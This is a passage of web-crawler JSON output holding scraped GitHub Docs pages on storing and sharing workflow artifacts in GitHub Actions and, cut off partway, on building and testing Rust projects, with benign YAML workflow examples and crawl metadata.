      "extractus": 8192,
      "readableText": 7649,
      "none": 32051,
      "readableTextIfPossible": 32051,
      "result": 7649,
      "markdown": 4990
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/storing-and-sharing-data-from-a-workflow",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/storing-and-sharing-data-from-a-workflow",
    "loadedTime": "2025-05-08T06:42:30.941Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/storing-and-sharing-data-from-a-workflow",
    "title": "Storing and sharing data from a workflow - GitHub Docs",
    "description": "Artifacts allow you to share data between jobs in a workflow and store data once that workflow has completed.",
    "author": null,
    "keywords": "Workflows",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Storing and sharing data from a workflow - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/storing-and-sharing-data-from-a-workflow"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/storing-and-sharing-data-from-a-workflow"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "1D08:1F1590:B3B56E:EE130E:681C524E",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:42:22 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-nyc-kteb1890061-NYC",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686542.257443, VS0, VE362",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "32453",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Storing and sharing data from a workflow\nArtifacts allow you to share data between jobs in a workflow and store data once that workflow has completed.\nAbout workflow artifacts\nArtifacts allow you to persist data after a job has completed, and share that data with another job in the same workflow. An artifact is a file or collection of files produced during a workflow run. For example, you can use artifacts to save your build and test output after a workflow run has ended. All actions and workflows called within a run have write access to that run's artifacts.\nBy default, GitHub stores build logs and artifacts for 90 days, and this retention period can be customized. For more information, see Usage limits, billing, and administration. The retention period for a pull request restarts each time someone pushes a new commit to the pull request.\nThese are some of the common artifacts that you can upload:\nLog files and core dumps\nTest results, failures, and screenshots\nBinary or compressed files\nStress test performance output and code coverage results\nStoring artifacts uses storage space on GitHub. GitHub Actions usage is free for standard GitHub-hosted runners in public repositories, and for self-hosted runners. See Choosing the runner for a job. For private repositories, each GitHub account receives a certain amount of free minutes and storage for use with GitHub-hosted runners, depending on the account's plan. Any usage beyond the included amounts is controlled by spending limits. For more information, see Managing billing for GitHub Actions.\nArtifacts are uploaded during a workflow run, and you can view an artifact's name and size in the UI. When an artifact is downloaded using the GitHub UI, all files that were individually uploaded as part of the artifact get zipped together into a single file. This means that billing is calculated based on the size of the uploaded artifact and not the size of the zip file.\nGitHub provides two actions that you can use to upload and download build artifacts. For more information, see the upload-artifact and download-artifact actions.\nTo share data between jobs:\nUploading files: Give the uploaded file a name and upload the data before the job ends.\nDownloading files: You can only download artifacts that were uploaded during the same workflow run. When you download a file, you can reference it by name.\nThe steps of a job share the same environment on the runner machine, but run in their own individual processes. To pass data between steps in a job, you can use inputs and outputs. For more information about inputs and outputs, see Metadata syntax for GitHub Actions.\nComparing artifacts and dependency caching\nArtifacts and caching are similar because they provide the ability to store files on GitHub, but each feature offers different use cases and cannot be used interchangeably.\nUse caching when you want to reuse files that don't change often between jobs or workflow runs, such as build dependencies from a package management system.\nUse artifacts when you want to save files produced by a job to view after a workflow run has ended, such as built binaries or build logs.\nFor more information on dependency caching, see Caching dependencies to speed up workflows.\nUploading build and test artifacts\nYou can create a continuous integration (CI) workflow to build and test your code. For more information about using GitHub Actions to perform CI, see About continuous integration with GitHub Actions.\nThe output of building and testing your code often produces files you can use to debug test failures and production code that you can deploy. You can configure a workflow to build and test the code pushed to your repository and report a success or failure status. You can upload the build and test output to use for deployments, debugging failed tests or crashes, and viewing test suite coverage.\nYou can use the upload-artifact action to upload artifacts. When uploading an artifact, you can specify a single file or directory, or multiple files or directories. You can also exclude certain files or directories, and use wildcard patterns. We recommend that you provide a name for an artifact, but if no name is provided then artifact will be used as the default name. For more information on syntax, see the actions/upload-artifact action.\nExample\nFor example, your repository or a web application might contain SASS and TypeScript files that you must convert to CSS and JavaScript. Assuming your build configuration outputs the compiled files in the dist directory, you would deploy the files in the dist directory to your web application server if all tests completed successfully.\n|-- hello-world (repository) | └── dist | └── tests | └── src | └── sass/app.scss | └── app.ts | └── output | └── test | \nThis example shows you how to create a workflow for a Node.js project that builds the code in the src directory and runs the tests in the tests directory. You can assume that running npm test produces a code coverage report named code-coverage.html stored in the output/test/ directory.\nThe workflow uploads the production artifacts in the dist directory, but excludes any markdown files. It also uploads the code-coverage.html report as another artifact.\nYAML\nname: Node CI on: [push] jobs: build_and_test: runs-on: ubuntu-latest steps: - name: Checkout repository uses: actions/checkout@v4 - name: npm install, build, and test run: | npm install npm run build --if-present npm test - name: Archive production artifacts uses: actions/upload-artifact@v4 with: name: dist-without-markdown path: | dist !dist/**/*.md - name: Archive code coverage results uses: actions/upload-artifact@v4 with: name: code-coverage-report path: output/test/code-coverage.html \nGenerating artifact attestations for builds\nArtifact attestations enable you to create unfalsifiable provenance and integrity guarantees for the software you build. In turn, people who consume your software can verify where and how your software was built.\nWhen you generate artifact attestations with your software, you create cryptographically signed claims that establish your build's provenance and include the following information:\nA link to the workflow associated with the artifact.\nThe repository, organization, environment, commit SHA, and triggering event for the artifact.\nOther information from the OIDC token used to establish provenance. For more information, see About security hardening with OpenID Connect.\nYou can also generate artifact attestations that include an associated software bill of materials (SBOM). Associating your builds with a list of the open source dependencies used in them provides transparency and enables consumers to comply with data protection standards.\nYou can access attestations after a build run, underneath the list of the artifacts the build produced.\nFor more information, see Using artifact attestations to establish provenance for builds.\nConfiguring a custom artifact retention period\nYou can define a custom retention period for individual artifacts created by a workflow. When using a workflow to create a new artifact, you can use retention-days with the upload-artifact action. This example demonstrates how to set a custom retention period of 5 days for the artifact named my-artifact:\nYAML\n- name: 'Upload Artifact' uses: actions/upload-artifact@v4 with: name: my-artifact path: my_file.txt retention-days: 5 \nThe retention-days value cannot exceed the retention limit set by the repository, organization, or enterprise.\nDownloading or deleting artifacts\nDuring a workflow run, you can use the download-artifact action to download artifacts that were previously uploaded in the same workflow run.\nAfter a workflow run has been completed, you can download or delete artifacts on GitHub or using the REST API. For more information, see Downloading workflow artifacts, Removing workflow artifacts, and REST API endpoints for GitHub Actions artifacts.\nDownloading artifacts during a workflow run\nThe actions/download-artifact action can be used to download previously uploaded artifacts during a workflow run.\nSpecify an artifact's name to download an individual artifact. If you uploaded an artifact without specifying a name, the default name is artifact.\n- name: Download a single artifact uses: actions/download-artifact@v4 with: name: my-artifact \nYou can also download all artifacts in a workflow run by not specifying a name. This can be useful if you are working with lots of artifacts.\n- name: Download all workflow run artifacts uses: actions/download-artifact@v4 \nIf you download all workflow run's artifacts, a directory for each artifact is created using its name.\nFor more information on syntax, see the actions/download-artifact action.\nValidating artifacts\nEvery time the upload-artifact action is used it returns an output called digest. This is a SHA256 digest of the Artifact you uploaded during a workflow run.\nWhen the download-artifact action is then used to download that artifact, it automatically calculates the digest for that downloaded artifact and validates that it matches the output from the upload-artifact step.\nIf the digest does not match, the run will display a warning in the UI and in the job logs.\nTo view the SHA256 digest you can open the logs for the upload-artifact job or check in the Artifact output that appears in the workflow run UI.\nPassing data between jobs in a workflow\nYou can use the upload-artifact and download-artifact actions to share data between jobs in a workflow. This example workflow illustrates how to pass data between jobs in the same workflow. For more information, see the actions/upload-artifact and download-artifact actions.\nJobs that are dependent on a previous job's artifacts must wait for the dependent job to complete successfully. This workflow uses the needs keyword to ensure that job_1, job_2, and job_3 run sequentially. For example, job_2 requires job_1 using the needs: job_1 syntax.\nJob 1 performs these steps:\nPerforms a math calculation and saves the result to a text file called math-homework.txt.\nUses the upload-artifact action to upload the math-homework.txt file with the artifact name homework_pre.\nJob 2 uses the result in the previous job:\nDownloads the homework_pre artifact uploaded in the previous job. By default, the download-artifact action downloads artifacts to the workspace directory that the step is executing in. You can use the path input parameter to specify a different download directory.\nReads the value in the math-homework.txt file, performs a math calculation, and saves the result to math-homework.txt again, overwriting its contents.\nUploads the math-homework.txt file. As artifacts are considered immutable in v4, the artifact is passed a different input, homework_final, as a name.\nJob 3 displays the result uploaded in the previous job:\nDownloads the homework_final artifact from Job 2.\nPrints the result of the math equation to the log.\nThe full math operation performed in this workflow example is (3 + 7) x 9 = 90.\nYAML\nname: Share data between jobs on: [push] jobs: job_1: name: Add 3 and 7 runs-on: ubuntu-latest steps: - shell: bash run: | expr 3 + 7 > math-homework.txt - name: Upload math result for job 1 uses: actions/upload-artifact@v4 with: name: homework_pre path: math-homework.txt job_2: name: Multiply by 9 needs: job_1 runs-on: windows-latest steps: - name: Download math result for job 1 uses: actions/download-artifact@v4 with: name: homework_pre - shell: bash run: | value=`cat math-homework.txt` expr $value \\* 9 > math-homework.txt - name: Upload math result for job 2 uses: actions/upload-artifact@v4 with: name: homework_final path: math-homework.txt job_3: name: Display results needs: job_2 runs-on: macOS-latest steps: - name: Download math result for job 2 uses: actions/download-artifact@v4 with: name: homework_final - name: Print the final result shell: bash run: | value=`cat math-homework.txt` echo The result is $value \nThe workflow run will archive any artifacts that it generated. For more information on downloading archived artifacts, see Downloading workflow artifacts.\nArtifacts from deleted workflow runs\nWhen a workflow run is deleted all artifacts associated with the run are also deleted from storage. You can delete a workflow run using the GitHub Actions UI, the REST API, or using the GitHub CLI, see: Deleting a workflow run, Delete a workflow run, or gh run delete.\nFurther reading\nManaging billing for GitHub Actions.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-what-your-workflow-does-storing-and-sharing-data-from-a-workflow-9s68ml.html",
  "markdown": "# Storing and sharing data from a workflow\n\nArtifacts allow you to share data between jobs in a workflow and store data once that workflow has completed.\n\n## [About workflow artifacts](#about-workflow-artifacts)\n\nArtifacts allow you to persist data after a job has completed, and share that data with another job in the same workflow. An artifact is a file or collection of files produced during a workflow run. For example, you can use artifacts to save your build and test output after a workflow run has ended. All actions and workflows called within a run have write access to that run's artifacts.\n\nBy default, GitHub stores build logs and artifacts for 90 days, and this retention period can be customized. For more information, see [Usage limits, billing, and administration](https://docs.github.com/en/actions/learn-github-actions/usage-limits-billing-and-administration#artifact-and-log-retention-policy). The retention period for a pull request restarts each time someone pushes a new commit to the pull request.\n\nThese are some of the common artifacts that you can upload:\n\n*   Log files and core dumps\n*   Test results, failures, and screenshots\n*   Binary or compressed files\n*   Stress test performance output and code coverage results\n\nStoring artifacts uses storage space on GitHub. GitHub Actions usage is free for standard GitHub-hosted runners in public repositories, and for self-hosted runners. See [Choosing the runner for a job](https://docs.github.com/en/actions/writing-workflows/choosing-where-your-workflow-runs/choosing-the-runner-for-a-job#standard-github-hosted-runners-for-public-repositories). For private repositories, each GitHub account receives a certain amount of free minutes and storage for use with GitHub-hosted runners, depending on the account's plan. Any usage beyond the included amounts is controlled by spending limits. For more information, see [Managing billing for GitHub Actions](https://docs.github.com/en/billing/managing-billing-for-github-actions).\n\nArtifacts are uploaded during a workflow run, and you can view an artifact's name and size in the UI. When an artifact is downloaded using the GitHub UI, all files that were individually uploaded as part of the artifact get zipped together into a single file. This means that billing is calculated based on the size of the uploaded artifact and not the size of the zip file.\n\nGitHub provides two actions that you can use to upload and download build artifacts. For more information, see the [upload-artifact](https://github.com/actions/upload-artifact) and [download-artifact](https://github.com/actions/download-artifact) actions.\n\nTo share data between jobs:\n\n*   **Uploading files:** Give the uploaded file a name and upload the data before the job ends.\n*   **Downloading files:** You can only download artifacts that were uploaded during the same workflow run. When you download a file, you can reference it by name.\n\nThe steps of a job share the same environment on the runner machine, but run in their own individual processes. To pass data between steps in a job, you can use inputs and outputs. For more information about inputs and outputs, see [Metadata syntax for GitHub Actions](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions).\n\n## [Comparing artifacts and dependency caching](#comparing-artifacts-and-dependency-caching)\n\nArtifacts and caching are similar because they provide the ability to store files on GitHub, but each feature offers different use cases and cannot be used interchangeably.\n\n*   Use caching when you want to reuse files that don't change often between jobs or workflow runs, such as build dependencies from a package management system.\n*   Use artifacts when you want to save files produced by a job to view after a workflow run has ended, such as built binaries or build logs.\n\nFor more information on dependency caching, see [Caching dependencies to speed up workflows](https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows#comparing-artifacts-and-dependency-caching).\n\n## [Uploading build and test artifacts](#uploading-build-and-test-artifacts)\n\nYou can create a continuous integration (CI) workflow to build and test your code. For more information about using GitHub Actions to perform CI, see [About continuous integration with GitHub Actions](https://docs.github.com/en/actions/automating-builds-and-tests/about-continuous-integration).\n\nThe output of building and testing your code often produces files you can use to debug test failures and production code that you can deploy. You can configure a workflow to build and test the code pushed to your repository and report a success or failure status. You can upload the build and test output to use for deployments, debugging failed tests or crashes, and viewing test suite coverage.\n\nYou can use the `upload-artifact` action to upload artifacts. When uploading an artifact, you can specify a single file or directory, or multiple files or directories. You can also exclude certain files or directories, and use wildcard patterns. We recommend that you provide a name for an artifact, but if no name is provided then `artifact` will be used as the default name. For more information on syntax, see the [actions/upload-artifact](https://github.com/actions/upload-artifact) action.\n\n### [Example](#example)\n\nFor example, your repository or a web application might contain SASS and TypeScript files that you must convert to CSS and JavaScript. Assuming your build configuration outputs the compiled files in the `dist` directory, you would deploy the files in the `dist` directory to your web application server if all tests completed successfully.\n\n```\n|-- hello-world (repository)\n|   └── dist\n|   └── tests\n|   └── src\n|       └── sass/app.scss\n|       └── app.ts\n|   └── output\n|       └── test\n|\n```\n\nThis example shows you how to create a workflow for a Node.js project that builds the code in the `src` directory and runs the tests in the `tests` directory. You can assume that running `npm test` produces a code coverage report named `code-coverage.html` stored in the `output/test/` directory.\n\nThe workflow uploads the production artifacts in the `dist` directory, but excludes any markdown files. It also uploads the `code-coverage.html` report as another artifact.\n\nYAML\n\n```\nname: Node CI\n\non: [push]\n\njobs:\n  build_and_test:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout repository\n        uses: actions/checkout@v4\n      - name: npm install, build, and test\n        run: |\n          npm install\n          npm run build --if-present\n          npm test\n      - name: Archive production artifacts\n        uses: actions/upload-artifact@v4\n        with:\n          name: dist-without-markdown\n          path: |\n            dist\n            !dist/**/*.md\n      - name: Archive code coverage results\n        uses: actions/upload-artifact@v4\n        with:\n          name: code-coverage-report\n          path: output/test/code-coverage.html\n```\n\n## [Generating artifact attestations for builds](#generating-artifact-attestations-for-builds)\n\nArtifact attestations enable you to create unfalsifiable provenance and integrity guarantees for the software you build. In turn, people who consume your software can verify where and how your software was built.\n\nWhen you generate artifact attestations with your software, you create cryptographically signed claims that establish your build's provenance and include the following information:\n\n*   A link to the workflow associated with the artifact.\n*   The repository, organization, environment, commit SHA, and triggering event for the artifact.\n*   Other information from the OIDC token used to establish provenance. For more information, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect).\n\nYou can also generate artifact attestations that include an associated software bill of materials (SBOM). Associating your builds with a list of the open source dependencies used in them provides transparency and enables consumers to comply with data protection standards.\n\nYou can access attestations after a build run, underneath the list of the artifacts the build produced.\n\nFor more information, see [Using artifact attestations to establish provenance for builds](https://docs.github.com/en/actions/security-guides/using-artifact-attestations-to-establish-provenance-for-builds).\n\n## [Configuring a custom artifact retention period](#configuring-a-custom-artifact-retention-period)\n\nYou can define a custom retention period for individual artifacts created by a workflow. When using a workflow to create a new artifact, you can use `retention-days` with the `upload-artifact` action. This example demonstrates how to set a custom retention period of 5 days for the artifact named `my-artifact`:\n\nYAML\n\n```\n  - name: 'Upload Artifact'\n    uses: actions/upload-artifact@v4\n    with:\n      name: my-artifact\n      path: my_file.txt\n      retention-days: 5\n```\n\nThe `retention-days` value cannot exceed the retention limit set by the repository, organization, or enterprise.\n\n## [Downloading or deleting artifacts](#downloading-or-deleting-artifacts)\n\nDuring a workflow run, you can use the [`download-artifact`](https://github.com/actions/download-artifact) action to download artifacts that were previously uploaded in the same workflow run.\n\nAfter a workflow run has been completed, you can download or delete artifacts on GitHub or using the REST API. For more information, see [Downloading workflow artifacts](https://docs.github.com/en/actions/managing-workflow-runs/downloading-workflow-artifacts), [Removing workflow artifacts](https://docs.github.com/en/actions/managing-workflow-runs/removing-workflow-artifacts), and [REST API endpoints for GitHub Actions artifacts](https://docs.github.com/en/rest/actions/artifacts).\n\n### [Downloading artifacts during a workflow run](#downloading-artifacts-during-a-workflow-run)\n\nThe [`actions/download-artifact`](https://github.com/actions/download-artifact) action can be used to download previously uploaded artifacts during a workflow run.\n\nSpecify an artifact's name to download an individual artifact. If you uploaded an artifact without specifying a name, the default name is `artifact`.\n\n```\n- name: Download a single artifact\n  uses: actions/download-artifact@v4\n  with:\n    name: my-artifact\n```\n\nYou can also download all artifacts in a workflow run by not specifying a name. This can be useful if you are working with lots of artifacts.\n\n```\n- name: Download all workflow run artifacts\n  uses: actions/download-artifact@v4\n```\n\nIf you download all workflow run's artifacts, a directory for each artifact is created using its name.\n\nFor more information on syntax, see the [actions/download-artifact](https://github.com/actions/download-artifact) action.\n\n## [Validating artifacts](#validating-artifacts)\n\nEvery time the upload-artifact action is used it returns an output called `digest`. This is a SHA256 digest of the Artifact you uploaded during a workflow run.\n\nWhen the download-artifact action is then used to download that artifact, it automatically calculates the digest for that downloaded artifact and validates that it matches the output from the upload-artifact step.\n\nIf the digest does not match, the run will display a warning in the UI and in the job logs.\n\nTo view the SHA256 digest you can open the logs for the upload-artifact job or check in the Artifact output that appears in the workflow run UI.\n\n## [Passing data between jobs in a workflow](#passing-data-between-jobs-in-a-workflow)\n\nYou can use the `upload-artifact` and `download-artifact` actions to share data between jobs in a workflow. This example workflow illustrates how to pass data between jobs in the same workflow. For more information, see the [actions/upload-artifact](https://github.com/actions/upload-artifact) and [download-artifact](https://github.com/actions/download-artifact) actions.\n\nJobs that are dependent on a previous job's artifacts must wait for the dependent job to complete successfully. This workflow uses the `needs` keyword to ensure that `job_1`, `job_2`, and `job_3` run sequentially. For example, `job_2` requires `job_1` using the `needs: job_1` syntax.\n\nJob 1 performs these steps:\n\n*   Performs a math calculation and saves the result to a text file called `math-homework.txt`.\n*   Uses the `upload-artifact` action to upload the `math-homework.txt` file with the artifact name `homework_pre`.\n\nJob 2 uses the result in the previous job:\n\n*   Downloads the `homework_pre` artifact uploaded in the previous job. By default, the `download-artifact` action downloads artifacts to the workspace directory that the step is executing in. You can use the `path` input parameter to specify a different download directory.\n*   Reads the value in the `math-homework.txt` file, performs a math calculation, and saves the result to `math-homework.txt` again, overwriting its contents.\n*   Uploads the `math-homework.txt` file. As artifacts are considered immutable in `v4`, the artifact is passed a different input, `homework_final`, as a name.\n\nJob 3 displays the result uploaded in the previous job:\n\n*   Downloads the `homework_final` artifact from Job 2.\n*   Prints the result of the math equation to the log.\n\nThe full math operation performed in this workflow example is `(3 + 7) x 9 = 90`.\n\nYAML\n\n```\nname: Share data between jobs\n\non: [push]\n\njobs:\n  job_1:\n    name: Add 3 and 7\n    runs-on: ubuntu-latest\n    steps:\n      - shell: bash\n        run: |\n          expr 3 + 7 > math-homework.txt\n      - name: Upload math result for job 1\n        uses: actions/upload-artifact@v4\n        with:\n          name: homework_pre\n          path: math-homework.txt\n\n  job_2:\n    name: Multiply by 9\n    needs: job_1\n    runs-on: windows-latest\n    steps:\n      - name: Download math result for job 1\n        uses: actions/download-artifact@v4\n        with:\n          name: homework_pre\n      - shell: bash\n        run: |\n          value=`cat math-homework.txt`\n          expr $value \\* 9 > math-homework.txt\n      - name: Upload math result for job 2\n        uses: actions/upload-artifact@v4\n        with:\n          name: homework_final\n          path: math-homework.txt\n\n  job_3:\n    name: Display results\n    needs: job_2\n    runs-on: macOS-latest\n    steps:\n      - name: Download math result for job 2\n        uses: actions/download-artifact@v4\n        with:\n          name: homework_final\n      - name: Print the final result\n        shell: bash\n        run: |\n          value=`cat math-homework.txt`\n          echo The result is $value\n```\n\nThe workflow run will archive any artifacts that it generated. For more information on downloading archived artifacts, see [Downloading workflow artifacts](https://docs.github.com/en/actions/managing-workflow-runs/downloading-workflow-artifacts).\n\n## [Artifacts from deleted workflow runs](#artifacts-from-deleted-workflow-runs)\n\nWhen a workflow run is deleted all artifacts associated with the run are also deleted from storage. You can delete a workflow run using the GitHub Actions UI, the REST API, or using the GitHub CLI, see: [Deleting a workflow run](https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/deleting-a-workflow-run), [Delete a workflow run](https://docs.github.com/en/rest/actions/workflow-runs?apiVersion=2022-11-28#delete-a-workflow-run), or [gh run delete](https://cli.github.com/manual/gh_run_delete).\n\n## [Further reading](#further-reading)\n\n*   [Managing billing for GitHub Actions](https://docs.github.com/en/billing/managing-billing-for-github-actions).",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 274,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-what-your-workflow-does-storing-and-sharing-data-from-a-workflow-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-what-your-workflow-does-storing-and-sharing-data-from-a-workflow-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-what-your-workflow-does-storing-and-sharing-data-from-a-workflow-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-what-your-workflow-does-storing-and-sharing-data-from-a-workflow-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-what-your-workflow-does-storing-and-sharing-data-from-a-workflow-readableTextIfPossibleH"
    },
    "lengths": {
      "extractus": 22379,
      "readableText": 20743,
      "none": 48918,
      "readableTextIfPossible": 20743,
      "result": 20743,
      "markdown": 15800
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-rust",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-rust",
    "loadedTime": "2025-05-08T06:42:38.527Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-rust",
    "title": "Building and testing Rust - GitHub Docs",
    "description": "You can create a continuous integration (CI) workflow to build and test your Rust project.",
    "author": null,
    "keywords": "CI",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Building and testing Rust - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-rust"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-rust"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "71C5:111BD9:42A9B3:54CE85:681C5257",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:42:31 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-nyc-kteb1890061-NYC",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686551.435870, VS0, VE476",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "29373",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Building and testing Rust - GitHub Docs\nYou can create a continuous integration (CI) workflow to build and test your Rust project.\nIntroduction\nThis guide shows you how to build, test, and publish a Rust package.\nGitHub-hosted runners have a tools cache with preinstalled software, which includes the dependencies for Rust. For a full list of up-to-date software and the preinstalled versions of Rust, see About GitHub-hosted runners.\nPrerequisites\nYou should already be familiar with YAML syntax and how it's used with GitHub Actions. For more information, see Workflow syntax for GitHub Actions.\nWe recommend that you have a basic understanding of the Rust language. For more information, see Getting started with Rust.\nUsing a Rust workflow template\nTo get started quickly, add a workflow template to the .github/workflows directory of your repository.\nGitHub provides a Rust workflow template that should work for most basic Rust projects. The subsequent sections of this guide give examples of how you can customize this workflow template.\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Actions.\nIf you already have a workflow in your repository, click New workflow.\nThe \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"Rust\".\nFilter the selection of workflows by clicking Continuous integration.\nOn the \"Rust - by GitHub Actions\" workflow, click Configure.\nEdit the workflow as required. For example, change the version of Rust.\nClick Commit changes.\nThe rust.yml workflow file is added to the .github/workflows directory of your repository.\nSpecifying a Rust version\nGitHub-hosted runners include a recent version of the Rust toolchain. You can use rustup to report on the version installed on a runner, override the version, and to install different toolchains. For more information, see The rustup book.\nThis example shows steps you could use to setup your runner environment to use the nightly build of rust and to report the version.\nYAML\n- name: Temporarily modify the rust toolchain version run: rustup override set nightly - name: Output rust version for educational purposes run: rustup --version \nCaching dependencies\nYou can cache and restore dependencies using the Cache action. This example assumes that your repository contains a Cargo.lock file.\nYAML\n- name: Cache uses: actions/cache@v4 with: path: | ~/.cargo/registry ~/.cargo/git target key: ${{ runner.os }}-cargo-${{ hashFiles('**/Cargo.lock') }} \nIf you have custom requirements or need finer controls for caching, you should explore other configuration options for the cache action. For more information, see Caching dependencies to speed up workflows.\nBuilding and testing your code\nYou can use the same commands that you use locally to build and test your code. This example workflow demonstrates how to use cargo build and cargo test in a job:\nYAML\njobs: build: runs-on: ubuntu-latest strategy: matrix: BUILD_TARGET: [release] # refers to a cargo profile outputs: release_built: ${{ steps.set-output.outputs.release_built }} steps: - uses: actions/checkout@v4 - name: Build binaries in \"${{ matrix.BUILD_TARGET }}\" mode run: cargo build --profile ${{ matrix.BUILD_TARGET }} 